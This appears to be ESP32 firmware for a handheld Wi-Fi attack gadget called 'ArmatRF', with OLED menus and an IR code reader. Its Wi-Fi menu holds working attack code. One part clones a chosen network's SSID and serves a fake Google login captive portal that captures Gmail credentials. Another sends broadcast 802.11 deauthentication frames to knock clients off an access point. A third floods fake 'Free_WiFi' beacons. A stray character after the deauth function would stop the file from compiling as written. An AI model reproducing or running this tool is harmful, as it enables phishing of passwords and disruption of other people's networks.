extern "C" {
    #include "esp_wifi.h"
  }
  
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <IRremote.hpp>

// --- OLED ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_ADDR 0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire);

// --- WiFi ---
WebServer server(80);
DNSServer dnsServer;

// --- IR Remote ---
#define IR_PIN 34  // GPIO13
IRrecv irrecv(IR_PIN);
decode_results results;

// --- Buttons ---
const int Dzax = 18;   // GPIO18
const int Enter = 4;  // GPIO19
const int Aj = 5;     // GPIO21

int dzax = HIGH;
int enter = HIGH;
int aj = HIGH;
int prevDzax = HIGH;
int prevEnter = HIGH;
int prevAj = HIGH;

// --- Menu states ---
bool inMainMenu = true;
bool inWiFiMenu = false;

// --- Menu lists ---
String mainMenu[5] = {"WiFi", "BLE", "Settings", "IR", "Exit"};
String wifiMenu[4] = {"WiFi-Clon", "WiFi-Deauth", "WiFi-Spam", "Back"};

// --- Variables for WiFi Clone/Deauth ---
String selectedSSID = "";
String capturedGmail = "";
String capturedPassword = "";

#define MAX_NETS 20
String ssidList[MAX_NETS];
uint8_t bssidList[MAX_NETS][6];
int chList[MAX_NETS];
int netCount = 0;
int deauthSelected = 0;
bool deauthRunning = false;

// --- WiFi Scan ---
void scanNetworksForDeauth() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("Scanning WiFi...");
  display.display();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  netCount = WiFi.scanNetworks();
  if (netCount == 0) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("No networks found");
    display.display();
    delay(1500);
    return;
  }
  if (netCount > MAX_NETS) netCount = MAX_NETS;

  for (int n = 0; n < netCount; n++) {
    ssidList[n] = WiFi.SSID(n);
    memcpy(bssidList[n], WiFi.BSSID(n), 6);
    chList[n] = WiFi.channel(n);
  }
}

// --- Phishing Page ---
void startPhishingPage() {
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html",
      "<html><body><center><h2>Google Login</h2>"
      "<form action='/login' method='post'>"
      "Gmail: <input name='gmail' type='text'><br>"
      "Password: <input name='password' type='password'><br>"
      "<input type='submit' value='Login'>"
      "</form></center></body></html>");
  });

  server.on("/login", HTTP_POST, []() {
    capturedGmail = server.arg("gmail");
    capturedPassword = server.arg("password");
    server.send(200, "text/html", "<h2>Thanks! You are logged in.</h2>");

    Serial.println("Gmail: " + capturedGmail);
    Serial.println("Password: " + capturedPassword);

    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("Captured:");
    display.println(capturedGmail);
    display.println(capturedPassword);
    display.display();
  });

  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
}

// --- WiFi Clone ---
void Clon() {
  int numNetworks = WiFi.scanNetworks();
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;
  int totalOptions = numNetworks + 1; // +1 Back

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = totalOptions - 1;
    if (selected >= totalOptions) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("WiFi Networks:");
    int linesToShow = totalOptions > 4 ? 4 : totalOptions;
    for (int i = 0; i < linesToShow; i++) {
      display.setCursor(0, 12 + i * 12);
      if (i == selected) display.print("> ");
      else display.print(" ");
      if (i < numNetworks) {
        display.println(WiFi.SSID(i));
      } else {
        display.println("Back");
      }
    }
    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == numNetworks) {
        break;
      } else {
        selectedSSID = WiFi.SSID(selected);
        Serial.println("Cloning: " + selectedSSID);

        WiFi.mode(WIFI_AP_STA);
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                          IPAddress(192, 168, 4, 1),
                          IPAddress(255, 255, 255, 0));
        WiFi.softAP(selectedSSID.c_str());
        startPhishingPage();

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Cloned SSID:");
        display.println(selectedSSID);
        display.println("Press ENTER to stop");
        display.display();

        while (true) {
          dnsServer.processNextRequest();
          server.handleClient();
          delay(10);

          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            dnsServer.stop();
            server.stop();
            WiFi.mode(WIFI_STA);
            WiFi.disconnect();
            break;
          }
        }
      }
    }
    delay(150);
    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
  }
  WiFi.scanDelete();
}

// --- WiFi Spam ---
void spamWiFiMenu() {
  int channel = 1;
  int selected = 0; // 0 = Start Spam, 1 = Back
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = 1;
    if (selected > 1) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("WiFi Spam:");

    display.setCursor(0, 16);
    if (selected == 0) display.print("> ");
    else display.print(" ");
    display.println("Start Spam");

    display.setCursor(0, 28);
    if (selected == 1) display.print("> ");
    else display.print(" ");
    display.println("Back");

    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == 1) {
        break;
      } else {
        while (true) {
          String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));
          WiFi.softAP(fakeSSID.c_str(), "", channel);

          display.clearDisplay();
          display.setCursor(0, 0);
          display.setTextSize(1);
          display.println("Spamming:");
          display.println(fakeSSID);
          display.println("Press ENTER to stop");
          display.display();

          Serial.println("Spammed: " + fakeSSID);
          delay(300);
          WiFi.softAPdisconnect(true);

          channel++;
          if (channel > 13) channel = 1;

          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            break;
          }
        }
      }
    }

    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
    delay(150);
  }
}

// --- IR Menu ---
void runIRMenu() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("IR-Read Mode");
  display.println("Press Enter to exit");
  display.display();

  IrReceiver.begin(IR_PIN, ENABLE_LED_FEEDBACK);

  while (true) {
    if (IrReceiver.decode()) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.setTextSize(1);
      display.println("IR Signal Received:");
      display.println(IrReceiver.decodedIRData.decodedRawData, HEX);
      display.display();
      Serial.println("IR Code: " + String(IrReceiver.decodedIRData.decodedRawData, HEX));
      IrReceiver.resume();
    }

    int enterState = digitalRead(Enter);
    if (enterState == LOW) {
      delay(300);
      IrReceiver.stop();
      break;
    }
    delay(50);
  }
}

// --- Menu drawing ---
void displayMainMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==Main Menu==");

  for (int j = 0; j < 5; j++) {
    display.setCursor(18, 12 + j * 12);
    if (j == selected) display.print("> ");
    else display.print(" ");
    display.println(mainMenu[j]);
  }
  display.display();
}

void displayWiFiMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==WiFi Menu==");

  for (int j = 0; j < 4; j++) {
    display.setCursor(18, 12 + j * 12);
    if (j == selected) display.print("> ");
    else display.print(" ");
    display.println(wifiMenu[j]);
  }
  display.display();
}
void sendDeauth(uint8_t *targetMac, uint8_t *apMac, int channel) {
    // Deauth frame template (26 bytes)
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,             // Type: Management, Subtype: Deauth
      0x00, 0x00,             // Duration
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination (will set later)
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Source (will set later)
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // BSSID (will set later)
      0x00, 0x00,             // Sequence / fragment
      0x01, 0x00              // Reason code: Unspecified
    };
  
    // Set destination (victim/client or broadcast)
    memcpy(&deauthPacket[4], targetMac, 6);
    // Set source (AP)
    memcpy(&deauthPacket[10], apMac, 6);
    // Set BSSID (AP)
    memcpy(&deauthPacket[16], apMac, 6);
  
    // Switch Wi-Fi to right channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
    // Send packet multiple times
    for (int i = 0; i < 20; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      delay(1);
    }
  }
s  
// --- Setup ---
void setup() {
  pinMode(Dzax, INPUT_PULLUP);
  pinMode(Aj, INPUT_PULLUP);
  pinMode(Enter, INPUT_PULLUP);

  Serial.begin(9600);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println(F("SSD1306 չի գտնվել"));
    while (true);
  }

  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(20, 20);
  display.println("ArmatRF");
  display.display();
  delay(1000);

  // Init WiFi Scan
  scanNetworksForDeauth();

  displayMainMenu(0);
}

// --- Loop ---
void loop() {
  dzax = digitalRead(Dzax);
  enter = digitalRead(Enter);
  aj = digitalRead(Aj);

  static int mainSelected = 0;
  static int wifiSelected = 0;

  if (inMainMenu) {
    if (dzax == LOW && prevDzax == HIGH) mainSelected++;
    if (aj == LOW && prevAj == HIGH) mainSelected--;
    if (mainSelected > 4) mainSelected = 0;
    if (mainSelected < 0) mainSelected = 4;

    displayMainMenu(mainSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (mainMenu[mainSelected] == "WiFi") {
        inMainMenu = false;
        inWiFiMenu = true;
        wifiSelected = 0;
        displayWiFiMenu(wifiSelected);
      } else if (mainMenu[mainSelected] == "BLE") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("BLE ֆունկցիա");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "Settings") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("Settings");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "IR") {
        runIRMenu();
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "Exit") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("Exit");
        display.display();
        delay(1500);
      }
    }
  } else if (inWiFiMenu) {
    if (dzax == LOW && prevDzax == HIGH) wifiSelected++;
    if (aj == LOW && prevAj == HIGH) wifiSelected--;
    if (wifiSelected > 3) wifiSelected = 0;
    if (wifiSelected < 0) wifiSelected = 3;

    displayWiFiMenu(wifiSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (wifiMenu[wifiSelected] == "WiFi-Clon") {
        Clon();
      } else if (wifiMenu[wifiSelected] == "WiFi-Spam") {
        spamWiFiMenu();
      } else if (wifiMenu[wifiSelected] == "Back") {
        inWiFiMenu = false;
        inMainMenu = true;
        displayMainMenu(mainSelected);
      }else if (wifiMenu[wifiSelected] == "WiFi-Deauth") {
        scanNetworksForDeauth();
      
        int selected = 0;
        while (true) {
          dzax = digitalRead(Dzax);
          aj = digitalRead(Aj);
          enter = digitalRead(Enter);
      
          if (dzax == LOW && prevDzax == HIGH) selected++;
          if (aj == LOW && prevAj == HIGH) selected--;
      
          if (selected < 0) selected = netCount - 1;
          if (selected >= netCount) selected = 0;
      
          display.clearDisplay();
          display.setCursor(0, 0);
          display.println("Select Target:");
          for (int i = 0; i < min(4, netCount); i++) {
            display.setCursor(0, 12 + i * 12);
            if (i == selected) display.print("> ");
            else display.print(" ");
            display.println(ssidList[i]);
          }
          display.display();
      
          if (enter == LOW && prevEnter == HIGH) {
            // Start deauth against selected AP
            display.clearDisplay();
            display.setCursor(0, 0);
            display.println("Deauth:");
            display.println(ssidList[selected]);
            display.println("Press Enter to stop");
            display.display();
      
            while (true) {
              sendDeauth((uint8_t*)"\xff\xff\xff\xff\xff\xff", bssidList[selected], chList[selected]);
              delay(100);
      
              int stop = digitalRead(Enter);
              if (stop == LOW) break;
            }
            break;
          }
      
          prevDzax = dzax;
          prevAj = aj;
          prevEnter = enter;
          delay(150);
        }
      }
      
    }
  }

  prevDzax = dzax;
  prevEnter = enter;
  prevAj = aj;
  delay(150);
}